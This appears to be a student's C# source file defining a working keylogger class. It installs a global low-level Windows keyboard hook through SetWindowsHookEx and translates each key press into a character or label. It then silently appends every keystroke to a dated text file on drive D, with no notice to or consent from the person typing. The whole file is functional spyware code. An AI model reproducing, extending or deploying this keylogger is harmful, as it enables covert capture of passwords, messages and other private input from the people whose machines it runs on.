using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SP_5
{
    public class KeyLogger
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // подключение библиотек
        // установка хука
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hinstance, uint threadId);

        //функция для снятия пользовательского хука
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);
        //передача сообщения для цепочки 
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
        //Функция для загрузки библиотек
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        //Номер глобального LowLewel-хука на клавиатуру
        const int WH_KEYBOARD_LL = 13;
        //Сообщение нажатия на клавишу
        const int WM_KEYDOWN = 0x100;
        //Создаем callback делегат
        private LowLevelKeyboardProc _proc = hookProc;
        //Создаем hook и пресваеваем ему значение 0
        private static IntPtr hhook = IntPtr.Zero;
        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";
                string fileName = $"D:\\keySpy_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) { };
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    //http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes
                    //Раскладкой великобритании
                    string keyStr = "";
                    switch (vkCode.ToString())
                    {
                        case "32":
                            keyStr = " ";
                            break;
                        case "8":
                            keyStr = "[backspace]";
                            break;
                        case "9":
                            keyStr = "[tab]";
                            break;
                        case "13":
                            keyStr = "[enter]";
                            break;
                        case "16":
                            keyStr = "[shift]";
                            break;
                        case "17":
                            keyStr = "[ctrl]";
                            break;
                        case "18":
                            keyStr = "[alt]";
                            break;
                        case "19":
                            keyStr = "[pause/break]";
                            break;
                        case "20":
                            keyStr = "[caps_lock]";
                            break;
                        case "27":
                            keyStr = "[escape]";
                            break;
                        case "33":
                            keyStr = "[page_up]";
                            break;
                        case "34":
                            keyStr = "[page_down]";
                            break;
                        case "35":
                            keyStr = "[end]";
                            break;
                        case "36":
                            keyStr = "[home]";
                            break;
                        case "37":
                            keyStr = "[left_arrow]";
                            break;
                        case "38":
                            keyStr = "[up_arrow]";
                            break;
                        case "39":
                            keyStr = "[right_arrow]";
                            break;
                        case "40":
                            keyStr = "[down_arrow]";
                            break;
                        case "45":
                            keyStr = "[insert]";
                            break;
                        case "46":
                            keyStr = "[delete]";
                            break;
                        case "48":
                            keyStr = "0";
                            break;
                        case "49":
                            keyStr = "1";
                            break;
                        case "50":
                            keyStr = "2";
                            break;
                        case "51":
                            keyStr = "3";
                            break;
                        case "52":
                            keyStr = "4";
                            break;
                        case "53":
                            keyStr = "5";
                            break;
                        case "54":
                            keyStr = "6";
                            break;
                        case "55":
                            keyStr = "7";
                            break;
                        case "56":
                            keyStr = "8";
                            break;
                        case "57":
                            keyStr = "9";
                            break;
                        case "65":
                            keyStr = "a";
                            break;
                        case "66":
                            keyStr = "b";
                            break;
                        case "67":
                            keyStr = "c";
                            break;
                        case "68":
                            keyStr = "d";
                            break;
                        case "69":
                            keyStr = "e";
                            break;
                        case "70":
                            keyStr = "f";
                            break;
                        case "71":
                            keyStr = "g";
                            break;
                        case "72":
                            keyStr = "h";
                            break;
                        case "73":
                            keyStr = "i";
                            break;
                        case "74":
                            keyStr = "j";
                            break;
                        case "75":
                            keyStr = "k";
                            break;
                        case "76":
                            keyStr = "l";
                            break;
                        case "77":
                            keyStr = "m";
                            break;
                        case "78":
                            keyStr = "n";
                            break;
                        case "79":
                            keyStr = "o";
                            break;
                        case "80":
                            keyStr = "p";
                            break;
                        case "81":
                            keyStr = "q";
                            break;
                        case "82":
                            keyStr = "r";
                            break;
                        case "83":
                            keyStr = "s";
                            break;
                        case "84":
                            keyStr = "t";
                            break;
                        case "85":
                            keyStr = "u";
                            break;
                        case "86":
                            keyStr = "v";
                            break;
                        case "87":
                            keyStr = "w";
                            break;
                        case "88":
                            keyStr = "x";
                            break;
                        case "89":
                            keyStr = "y";
                            break;
                        case "90":
                            keyStr = "z";
                            break;
                        case "91":
                            keyStr = "[left_window_key]";
                            break;
                        case "92":
                            keyStr = "[right_window_key]";
                            break;
                        case "93":
                            keyStr = "[select_key]";
                            break;
                        case "96":
                            keyStr = "[numpad_0]";
                            break;
                        case "97":
                            keyStr = "[numpad_1]";
                            break;
                        case "98":
                            keyStr = "[numpad_2]";
                            break;
                        case "99":
                            keyStr = "[numpad_3]";
                            break;
                        case "100":
                            keyStr = "[numpad_4]";
                            break;
                        case "101":
                            keyStr = "[numpad_5]";
                            break;
                        case "102":
                            keyStr = "[numpad_6]";
                            break;
                        case "103":
                            keyStr = "[numpad_7]";
                            break;
                        case "104":
                            keyStr = "[numpad_8]";
                            break;
                        case "105":
                            keyStr = "[numpad_9]";
                            break;
                        case "106":
                            keyStr = "*";
                            break;
                        case "107":
                            keyStr = "+";
                            break;
                        case "109":
                            keyStr = "-";
                            break;
                        case "110":
                            keyStr = ".";
                            break;
                        case "111":
                            keyStr = "/";
                            break;
                        case "112":
                            keyStr = "[F1]";
                            break;
                        case "113":
                            keyStr = "[F2]";
                            break;
                        case "114":
                            keyStr = "[F3]";
                            break;
                        case "115":
                            keyStr = "[F4]";
                            break;
                        case "116":
                            keyStr = "[f5]";
                            break;
                        case "117":
                            keyStr = "[F6]";
                            break;
                        case "118":
                            keyStr = "[F7]";
                            break;
                        case "119":
                            keyStr = "[F8]";
                            break;
                        case "120":
                            keyStr = "[F9]";
                            break;
                        case "121":
                            keyStr = "[F10]";
                            break;
                        case "122":
                            keyStr = "[F11]";
                            break;
                        case "123":
                            keyStr = "[F12]";
                            break;
                        case "144":
                            keyStr = "[num_lock]";
                            break;
                        case "145":
                            keyStr = "[scroll_lock]";
                            break;
                        case "186":
                            keyStr = ";";
                            break;
                        case "187":
                            keyStr = "=";
                            break;
                        case "188":
                            keyStr = ",";
                            break;
                        case "189":
                            keyStr = "_";
                            break;
                        case "190":
                            keyStr = ">";
                            break;
                        case "191":
                            keyStr = "/";
                            break;
                        case "192":
                            keyStr = "`";
                            break;
                        case "219":
                            keyStr = "[";
                            break;
                        case "220":
                            keyStr = "[back_slash]";
                            break;
                        case "221":
                            keyStr = "]";
                            break;
                        case "222":
                            keyStr = "'";
                            break;
                    }
                    sw.Write(keyStr);
                    sw.Close();
                }
                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }

        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hinstance, 0);
        }
        public void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }

    }
}
